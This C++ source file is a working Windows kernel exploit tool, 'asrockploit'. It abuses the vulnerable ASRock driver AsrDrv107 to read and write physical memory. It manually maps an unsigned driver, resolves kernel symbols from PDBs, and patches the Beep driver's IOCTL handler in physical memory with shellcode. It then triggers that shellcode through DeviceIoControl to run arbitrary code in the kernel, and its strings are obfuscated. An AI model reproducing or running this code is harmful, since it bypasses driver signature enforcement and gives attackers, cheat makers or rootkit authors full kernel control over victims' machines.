#include <unordered_map>
#include <Shlwapi.h>

#include "pdbparser.h"
#include "ntdll.h"
#include "asrdrv107.h"
#include "defs.h"

class asrockploit {
private:
    typedef struct _SYSTEM_MODULE_ENTRY
    {
        HANDLE Section;
        PVOID MappedBase;
        PVOID ImageBase;
        ULONG ImageSize;
        ULONG Flags;
        USHORT LoadOrderIndex;
        USHORT InitOrderIndex;
        USHORT LoadCount;
        USHORT OffsetToFileName;
        UCHAR FullPathName[256];

    }   SYSTEM_MODULE_ENTRY, * PSYSTEM_MODULE_ENTRY;

    typedef struct _SYSTEM_MODULE_INFORMATION
    {
        ULONG                 ModulesCount;
        SYSTEM_MODULE_ENTRY   Modules[0];
    }   SYSTEM_MODULE_INFORMATION, * PSYSTEM_MODULE_INFORMATION;

    typedef struct my_irp_struct
    {
        void* ntoskrnl;

        void (*nt_memcpy)(void* dst, void* src, size_t len);
        void* (*nt_ExAllocatePoolWithTag)(ULONG PoolType, SIZE_T NumberOfBytes, ULONG Tag);
        NTSTATUS(*nt_PsCreateSystemThread)(PHANDLE ThreadHandle, ULONG DesiredAccess, void* ObjectAttributes, HANDLE ProcessHandle, void* ClientId, void* StartRoutine, PVOID StartContext);
        void* nt_IofCompleteRequest;

        uintptr_t nt_MiLookupDataTableEntry;
        uintptr_t nt_PsGetNextProcess;
        uintptr_t nt_ExUnlockHandleTableEntry;

        void* my_driver;

        SIZE_T payload_size;
        UCHAR payload[];
    } my_irp_struct;

    #pragma pack (push, 1)
    struct PhysicalMemoryPage//CM_PARTIAL_RESOURCE_DESCRIPTOR
    {
        uint8_t type;
        uint8_t shareDisposition;
        uint16_t flags;
        uint64_t pBegin;
        uint32_t sizeButNotExactly;
        uint32_t pad;

        static constexpr uint16_t cm_resource_memory_large_40{ 0x200 };
        static constexpr uint16_t cm_resource_memory_large_48{ 0x400 };
        static constexpr uint16_t cm_resource_memory_large_64{ 0x800 };

        uint64_t size()const noexcept
        {
            if (flags & cm_resource_memory_large_40)
                return uint64_t{ sizeButNotExactly } << 8;
            else if (flags & cm_resource_memory_large_48)
                return uint64_t{ sizeButNotExactly } << 16;
            else if (flags & cm_resource_memory_large_64)
                return uint64_t{ sizeButNotExactly } << 32;
            else
                return uint64_t{ sizeButNotExactly };
        }

    };
    static_assert(sizeof(PhysicalMemoryPage) == 20, "PhysicalMemoryPage size wrong"); //vdm
    #pragma pack (pop)


    struct physical_memory_layout_info_t {
        uint64_t idk;
        uint64_t idk2;
        ULONG count;
        PhysicalMemoryPage pmi[];
    } *physical_memory_layout_info = NULL;

    struct code_backup_t
    {
        uint64_t phys_addr;
        BYTE page_contents[0x1000];
    };

public:
    HANDLE handle_beep;
    std::unordered_map<std::string, uint64_t> kernel_modules;
    size_t my_shellcode_data_sz = 0;
    my_irp_struct* my_shellcode_data = 0;
    BYTE my_shellcode[0x1000];
    std::vector<code_backup_t> beep_backup;
    bool found_ioctl = false;

#define FIND_FUNCTION(name) { \
  void* addr = (void*)GetProcAddress(hNtoskrnl, #name);\
  if (!addr) {\
    printf(crypt("[-] Couldn't resolve %s\n"), #name);\
    std::getchar();\
  }\
  uintptr_t offset = (uint64_t)addr - (uint64_t)hNtoskrnl;\
  (my_shellcode_data->nt_##name) = (decltype(my_shellcode_data->nt_##name))((uintptr_t)addr - (uintptr_t)hNtoskrnl + ntoskrnl_base);\
  printf(crypt("[+] %s at physical address %#llx + %#llx = %#llx\n"), #name, ntoskrnl_base, offset, (LPVOID)(my_shellcode_data->nt_##name));\
} //literally pasted

    void enum_kernel_modules() {
        ULONG bytes = 0;
        NTSTATUS status = NtQuerySystemInformation(SystemModuleInformation, 0, bytes, &bytes);
        if (!bytes)
        {
            printf(crypt("[-] NtQuerySystemInformation while querying system!\n"));
            std::getchar();
        }

        PSYSTEM_MODULE_INFORMATION pMods = (PSYSTEM_MODULE_INFORMATION)malloc(bytes);
        RtlZeroMemory(pMods, bytes);

        status = NtQuerySystemInformation(SystemModuleInformation, pMods, bytes, &bytes);
        if (status < 0)
        {
            printf(crypt("[-] NtQuerySystemInformation while querying system!\n"));
            std::getchar();
        }

        printf(crypt("[+] There are %u modules!\n"), pMods->ModulesCount);

        for (int32_t i = 0; i < pMods->ModulesCount; i++)
        {
            const char* filename = PathFindFileNameA((const char*)pMods->Modules[i].FullPathName);
            kernel_modules[filename] = reinterpret_cast<uint64_t>(pMods->Modules[i].ImageBase);
        }
    }

    bool manual_map(LPCSTR name) {
        HANDLE hFile = CreateFileA(name, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL);
        if (hFile == INVALID_HANDLE_VALUE) {
            printf(crypt("[-] Invalid handle manual mapping error: 0x%llx!\n"), GetLastError());
            std::getchar();
        }

        HANDLE hMapping = CreateFileMappingA(hFile, NULL, PAGE_READONLY | SEC_IMAGE_NO_EXECUTE, 0, 0, NULL);
        if (!hMapping) {
            printf(crypt("[-] Cannot make file mapping error: 0x%llx!\n"), GetLastError());
            std::getchar();
        }

        LPVOID lpBase = (char*)MapViewOfFile(hMapping, FILE_MAP_READ, 0, 0, 0);
        if (!lpBase) {
            printf(crypt("[-] Cannot make file mapping view error: 0x%llx!\n"), GetLastError());
            std::getchar();
        }

        printf(crypt("[+] %s loaded to: 0x%llx!\n"), name, lpBase);

        PIMAGE_DOS_HEADER image = (PIMAGE_DOS_HEADER)lpBase;
        if (image->e_magic != IMAGE_DOS_SIGNATURE) {
            printf(crypt("[-] dos signature doesn't match error: 0x%llx!\n"), GetLastError());
            std::getchar();
        }

        PIMAGE_NT_HEADERS fileHeader = (PIMAGE_NT_HEADERS)((uintptr_t)lpBase + image->e_lfanew);
        if (fileHeader->Signature != IMAGE_NT_SIGNATURE) {
            printf(crypt("[-] image signature doesn't match error: 0x%llx!\n"), GetLastError());
            std::getchar();
        }

        void* some_memory = VirtualAlloc(NULL, fileHeader->OptionalHeader.SizeOfImage, MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE);
        printf(crypt("[+] Memory allocated: 0x%llx!\n"), some_memory);

        int NonPagedPoolExecute = 0;

        WORD nSections = fileHeader->FileHeader.NumberOfSections;
        IMAGE_SECTION_HEADER* sectionHeaders = (IMAGE_SECTION_HEADER*)((uintptr_t)&fileHeader->OptionalHeader + fileHeader->FileHeader.SizeOfOptionalHeader);
        DWORD imageBase = fileHeader->OptionalHeader.ImageBase;
        DWORD imageSize = fileHeader->OptionalHeader.SizeOfImage;

        memcpy(some_memory, image, fileHeader->OptionalHeader.SizeOfHeaders);
        for (int i = 0; i < nSections; i++) {

            void* src = (void*)((uintptr_t)image + sectionHeaders->VirtualAddress);
            void* dst = (void*)((uintptr_t)some_memory + sectionHeaders->VirtualAddress);

            size_t sz = sectionHeaders->SizeOfRawData;
            memcpy(dst, src, sz);
            printf(crypt("[+] Mapping %d bytes to %#llx from %#llx- section %s\n"), sz, dst, src, (char*)&sectionHeaders->Name);
            sectionHeaders++;
        }

        IMAGE_DATA_DIRECTORY* import_directory_info = (IMAGE_DATA_DIRECTORY*)&fileHeader->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT];
        IMAGE_IMPORT_DESCRIPTOR* import_descriptor = (IMAGE_IMPORT_DESCRIPTOR*)((uintptr_t)some_memory + import_directory_info->VirtualAddress);

        while (true) {
            if (import_descriptor->Characteristics == 0) {
                break;
            }
            char* name_of_module = (char*)((uintptr_t)some_memory + import_descriptor->Name);
            std::string name_str = name_of_module;
            std::wstring name_wstr(name_str.begin(), name_str.end());

            HMODULE hModule = GetModuleHandleA(name_of_module);
            if (!hModule) {
                hModule = LoadLibraryEx(name_wstr.c_str(), NULL, DONT_RESOLVE_DLL_REFERENCES | LOAD_LIBRARY_SEARCH_DEFAULT_DIRS);
                if (!hModule) {
                    printf(crypt("[-] couldnt get error of module error: 0x%llx!\n"), GetLastError());
                    std::getchar();
                }
            }
            printf(crypt("[+] Loaded module % s at % #llx, real addr % #llx \n"), name_of_module, hModule, kernel_modules[name_of_module]);

            IMAGE_THUNK_DATA* cur_thunk = (IMAGE_THUNK_DATA*)((uintptr_t)some_memory + import_descriptor->OriginalFirstThunk);
            void** iat = (void**)((uintptr_t)some_memory + import_descriptor->FirstThunk);
            while (cur_thunk->u1.Function != 0) {
                if (cur_thunk->u1.Function & 0x80000000) {
                    printf(crypt("[-] Not support error: 0x%llx!\n"), GetLastError());
                    std::getchar();
                }
                else {
                    IMAGE_IMPORT_BY_NAME* name_data = (IMAGE_IMPORT_BY_NAME*)((uintptr_t)some_memory + cur_thunk->u1.Function);
                    char* name_of_function = (char*)(name_data->Name);
                    printf(crypt("[+] Importing %s\n"), name_of_function);

                    void* function_addr = GetProcAddress(hModule, name_of_function);
                    uint64_t func_offset = (uint64_t)function_addr - (uint64_t)hModule;
                    void* real_addr = (void*)((uint64_t)kernel_modules[name_of_module] + func_offset);

                    *iat = (void*)real_addr;
                }

                cur_thunk++;
                iat++;
            }
            import_descriptor++;

        }

        IMAGE_DATA_DIRECTORY* reloc_directory_info = (IMAGE_DATA_DIRECTORY*)&fileHeader->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC];
        IMAGE_BASE_RELOCATION* cur_reloc = (IMAGE_BASE_RELOCATION*)((uintptr_t)some_memory + reloc_directory_info->VirtualAddress);

        void* reloc_table_end = (void*)((uintptr_t)cur_reloc + reloc_directory_info->Size);

        uintptr_t imageBaseDifference = (uintptr_t)some_memory - fileHeader->OptionalHeader.ImageBase;

        while (cur_reloc != reloc_table_end) {
            ULONG size_of_block = cur_reloc->SizeOfBlock;
            ULONG rva = cur_reloc->VirtualAddress;

            int num_entries = (size_of_block - sizeof(IMAGE_BASE_RELOCATION)) / sizeof(__int16);
            printf(crypt("[+] Relocing %d entries\n"), num_entries);

            uint16_t* reloc_entry = (uint16_t*)((uintptr_t)cur_reloc + sizeof(IMAGE_BASE_RELOCATION));
            for (int i = 0; i < num_entries; i++) {
                uint16_t offset = *reloc_entry & 0xFFF;
                USHORT reloc_type = *reloc_entry >> 12;


                if (reloc_type == IMAGE_REL_BASED_DIR64) {
                    printf(crypt("[+] Reloc of type IMAGE_REL_BASED_DIR64 at offset %#x+%#llx\n"), rva, offset); 
                }
                else if (reloc_type == IMAGE_REL_BASED_ABSOLUTE) {
                    printf(crypt("[+] Reloc of type IMAGE_REL_BASED_ABSOLUTE at offset %#x+%#llx\n"), rva, offset);
                }
                else {
                    printf(crypt("[-] Not support reloc type: 0x%llx!\n"), reloc_type); //32 bit export koyan eşekler için
                    std::getchar();
                }
                reloc_entry++;
            }
            cur_reloc = (IMAGE_BASE_RELOCATION*)((uintptr_t)cur_reloc + cur_reloc->SizeOfBlock);
        }

        size_t payload_sz = imageSize;
        my_shellcode_data_sz = sizeof(my_irp_struct) + payload_sz;
        my_shellcode_data = (my_irp_struct*)malloc(my_shellcode_data_sz);
        if (!my_shellcode_data)
        {
            printf(crypt("[-] Malloc fail error: 0x%llx!\n"), GetLastError());
            std::getchar();
        }
        memcpy(my_shellcode_data->payload, some_memory, payload_sz);
        my_shellcode_data->payload_size = payload_sz;
        printf(crypt("[+] Payload size = %llx bytes\n"), my_shellcode_data_sz);

    }

    void create_ioctl_payload() {
        uint64_t ntoskrnl_base = kernel_modules["ntoskrnl.exe"];
        if (!ntoskrnl_base)
        {
            printf(crypt("[-] ntos base error: 0x%llx!\n"), GetLastError());
            std::getchar();
        }

        printf(crypt("[+] Ntoskrnl at %p\n"), ntoskrnl_base);

        HMODULE hNtoskrnl = LoadLibraryExA(crypt("ntoskrnl.exe"), NULL, DONT_RESOLVE_DLL_REFERENCES);
        if (!hNtoskrnl)
        {
            printf(crypt("[-] Failed to map ntos error: 0x%llx!\n"), GetLastError());
            std::getchar();
        }

        printf(crypt("[+] Ntoskrnl loaded at %#llx, physical addr at %llx\n"), hNtoskrnl, ntoskrnl_base);
        my_shellcode_data->ntoskrnl = (void*)ntoskrnl_base;

        FIND_FUNCTION(memcpy);
        FIND_FUNCTION(ExAllocatePoolWithTag);
        FIND_FUNCTION(PsCreateSystemThread);
        FIND_FUNCTION(IofCompleteRequest);

        printf(crypt("[+] Starting PDB Parser\n"));
        std::vector<std::string> pdbs = { R"(C:\Windows\System32\ntoskrnl.exe)" };

        bool pdbret = pdb_parser.LocatePdbs(pdbs);
        if (!pdbret) {
            printf(crypt("[-] PDB parsing failed error: 0x%llx!\n"), GetLastError());
            std::getchar();
        }

        uintptr_t rva_of_MiLookupDataTableEntry = pdb_parser.LocateSymbol(crypt("MiLookupDataTableEntry").decrypt());
        printf(crypt("[+] MiLookupDataTableEntry is offset %x from ntoskrnl start\n"), rva_of_MiLookupDataTableEntry);
        my_shellcode_data->nt_MiLookupDataTableEntry = (ntoskrnl_base + rva_of_MiLookupDataTableEntry);
        printf(crypt("[+] MiLookupDataTableEntry (non-exported function) at %p\n"), my_shellcode_data->nt_MiLookupDataTableEntry);

        uintptr_t rva_of_PsGetNextProcess = pdb_parser.LocateSymbol(crypt("PsGetNextProcess").decrypt());
        printf(crypt("[+] PsGetNextProcess is offset %x from ntoskrnl start\n"), rva_of_PsGetNextProcess);
        my_shellcode_data->nt_PsGetNextProcess = ((uintptr_t)ntoskrnl_base + rva_of_PsGetNextProcess);
        printf(crypt("[+] PsGetNextProcess (non-exported function) at %p\n"), my_shellcode_data->nt_PsGetNextProcess);

        uintptr_t rva_of_ExUnlockHandleTableEntry = pdb_parser.LocateSymbol(crypt("ExUnlockHandleTableEntry").decrypt());
        printf(crypt("[+] ExUnlockHandleTableEntry is offset %x from ntoskrnl start\n"), rva_of_ExUnlockHandleTableEntry);
        my_shellcode_data->nt_ExUnlockHandleTableEntry = ((uintptr_t)ntoskrnl_base + rva_of_ExUnlockHandleTableEntry);
        printf(crypt("[+] ExUnlockHandleTableEntry (non-exported function) at %p\n"), my_shellcode_data->nt_ExUnlockHandleTableEntry);
    }

    void generate_shellcode() {
        memset(my_shellcode, 0, sizeof(my_shellcode));

        HMODULE my_driver = LoadLibraryExA(crypt("driver.sys"), NULL, DONT_RESOLVE_DLL_REFERENCES);
        if (!my_driver)
        {
            printf(crypt("[-] Failed to map dummy driver error: 0x%llx!\n"), GetLastError());
            std::getchar();
        }

        void* driver_ioctl_handler_addr = (void*)GetProcAddress(my_driver, crypt("?MyIRPControl@@YA_JPEAU_DEVICE_OBJECT@@PEAU_IRP@@@Z"));
        printf(crypt("[+] Our IRP control at %#x\n"), driver_ioctl_handler_addr);
        if (!driver_ioctl_handler_addr) {
            printf(crypt("[-] No shellcode error: 0x%llx!\n"), GetLastError());
            std::getchar();
        }
        memcpy(my_shellcode, driver_ioctl_handler_addr, 0x1000);
        FreeLibrary(my_driver);
    }

    void scan_physical_memory() {
        printf(crypt("[+] Querying Physical Memory!\n"));
        HKEY h_key;
        DWORD type, size = 0;
        RegOpenKeyEx(HKEY_LOCAL_MACHINE, crypt(L"HARDWARE\\RESOURCEMAP\\System Resources\\Physical Memory"), 0, KEY_READ, &h_key);
        RegQueryValueEx(h_key, crypt(L".Translated"), NULL, &type, NULL, &size);
        if (!size)
        {
            printf(crypt("[-] Cant open reg error: 0x%llx!\n"), GetLastError());
            std::getchar();
        }
        BYTE* data = (BYTE*)malloc(size);
        RegQueryValueEx(h_key, crypt(L".Translated"), NULL, &type, (BYTE*)data, &size);
        physical_memory_layout_info = (physical_memory_layout_info_t*)data;

        ULONG count = physical_memory_layout_info->count;
        if (!count)
        {
            printf(crypt("[-] Querying Physical Memory Failed error: 0x%llx!\n"), GetLastError());
            std::getchar();
        }
        uint64_t total_pmem = 0;
        for (unsigned i = 0; i < count; i++)
        {
            uint64_t end = physical_memory_layout_info->pmi[i].pBegin + physical_memory_layout_info->pmi[i].size();
            printf(crypt("[Physical Memory Range % d] % #llx - % #llx, type % 02x, flags % 04x, sharing % 02x, size % llf GB\n"), i + 1, (uint64_t)physical_memory_layout_info->pmi[i].pBegin, (uint64_t)end, physical_memory_layout_info->pmi[i].type, physical_memory_layout_info->pmi[i].flags, physical_memory_layout_info->pmi[i].shareDisposition, (double)physical_memory_layout_info->pmi[i].size() / 1e9);
            total_pmem += physical_memory_layout_info->pmi[i].size();
        }
        printf(crypt("[+] Have %.1f GB physical memory mapped\n"), (double)total_pmem / 1e9);
    }

    void scan_memory_range(uint64_t start, uint64_t end) {

        printf(crypt("[+] Starting Memory Scan for physical address range %#x to %#x for Beep IOCTL Handler...\n"), start, end);

        unsigned char beep_control_pattern[53] = {
            0x40, 0x53, 0x48, 0x83, 0xEC, 0x20, 0x4C, 0x8B, 0x82, 0xB8, 0x00, 0x00,
            0x00, 0x4C, 0x8B, 0xD2, 0x41, 0x8B, 0x40, 0x18, 0x2D, 0x00, 0x00, 0x01,
            0x00, 0x0F, 0x84, 0x63, 0x04, 0x00, 0x00, 0x83, 0xF8, 0x04, 0x0F, 0x85,
            0x4A, 0x04, 0x00, 0x00, 0x33, 0xC0, 0x41, 0x83, 0x78, 0x08, 0x08, 0x0F,
            0x82, 0x46, 0x04, 0x00, 0x00
        };

        uint64_t function_offset = 0x290;  // hardcode anlarısn ya
        const size_t buf_size = 0x10000;
        BYTE buf[buf_size];

        int cnt = 0;
        for (uint64_t ptr = start; ptr < end; ptr += buf_size) {
            cnt++;
            if (cnt % 10000 == 0) {
                printf(crypt("[+] Scanning %#llx to %#llx\r"), ptr, ptr + buf_size);
                cnt = 0;
            }

            NTSTATUS val = memory.read_physical_memory(ptr, buf_size, buf);

            for (uint64_t i = 0; i < buf_size; i += 0x1000) {
                uint64_t addr = ((uint64_t)buf + i + function_offset);
                uint64_t phys_addr = ((uint64_t)ptr + i + function_offset);

                if (memcmp((BYTE*)addr, beep_control_pattern, sizeof(beep_control_pattern)) == 0) {
                    printf(crypt("[+] Found Beep at physical address: %#llx\n"), phys_addr);

                    code_backup_t old_beep_handler;
                    old_beep_handler.phys_addr = ptr + i;
                    memcpy(old_beep_handler.page_contents, (BYTE*)(buf + i), 0x1000);
                    beep_backup.push_back(old_beep_handler);

                    memory.write_physical_memory(phys_addr, 0x1000 - function_offset, my_shellcode);

                    found_ioctl = true;

                }
            }
        }

    }

    void patch_beep()
    {
        for (unsigned i = 0; i < physical_memory_layout_info->count; i++)
        {
            uint64_t start = physical_memory_layout_info->pmi[i].pBegin;
            uint64_t end = start + physical_memory_layout_info->pmi[i].size();
            this->scan_memory_range(start, end);
        }

        if (!found_ioctl)
        {
            printf(crypt("[-] didn't find beep error: 0x%llx!\n"), GetLastError());
            std::getchar();
        }
    }

    void call_driver_entry() {

        printf(crypt("[+] Calling driver with input size %d bytes\n"), my_shellcode_data_sz);

        char out_buf[16];
        DWORD bytes_returned;

        BOOL result = DeviceIoControl(handle_beep, 0x1234, my_shellcode_data, my_shellcode_data_sz, out_buf, sizeof(out_buf), &bytes_returned, NULL);
        printf(crypt("[+] Trigger DeviceIoControl returns %d\n"), result);

        for (int i = 0; i < beep_backup.size(); i++)
        {
            memory.write_physical_memory(beep_backup[i].phys_addr, 0x1000, beep_backup[i].page_contents);
            printf(crypt("[+] Restored code at %p\n"), (void*)beep_backup[i].phys_addr);
        }
    }
};

int main()
{
	AddDllDirectory(crypt(L"C:\\Windows\\System32\\drivers")); //asrbubum

    asrockploit ploiter;
    ploiter.enum_kernel_modules();
    ploiter.manual_map("driver.sys"); //exe yanında export için kullanılan driver olması gerek
    ploiter.create_ioctl_payload();
    ploiter.generate_shellcode();
    ploiter.scan_physical_memory();

    ploiter.handle_beep = CreateFileA(crypt("\\\\.\\GlobalRoot\\Device\\Beep"), GENERIC_READ | GENERIC_WRITE | SYNCHRONIZE, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    if (!ploiter.handle_beep || ploiter.handle_beep == INVALID_HANDLE_VALUE) {
        printf(crypt("[-] Can't handle beep error: 0x%llx!\n"), GetLastError());
        std::getchar();
    }

    printf(crypt("[>] Beep Handle: %llx\n"), ploiter.handle_beep);

    if (!memory.create_handle()) {
        printf(crypt("[-] No vulb driver (asrdrv107)\n"));
        std::getchar();
    }

    printf(crypt("[>] AsrDrv107 Handle: %llx\n"), memory.get_handle());

    ploiter.patch_beep();

    ploiter.call_driver_entry();
    std::getchar();
}
